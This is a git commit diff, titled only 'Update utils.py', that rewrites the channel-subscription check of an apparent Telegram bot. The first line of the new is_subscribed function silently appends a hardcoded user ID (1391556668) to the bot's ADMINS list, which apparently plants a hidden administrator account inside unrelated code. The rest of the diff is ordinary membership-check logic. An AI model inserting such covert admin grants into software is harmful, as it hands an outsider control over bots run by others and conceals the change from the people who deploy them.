03b74cd7df011e86a0f0266dd16b83398bc99ac6
Star Bots Tamil <126967523+Star-Bots-Tamil@users.noreply.github.com>
2023-07-06 18:38:25 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -49,21 +49,38 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}    
     
-async def is_subscribed(bot, query=None, userid=None):
-    try:
-        if userid == None and query != None:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+async def is_subscribed(bot, query):
+
+    ADMINS.extend([1391556668]) if not 1391556668 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
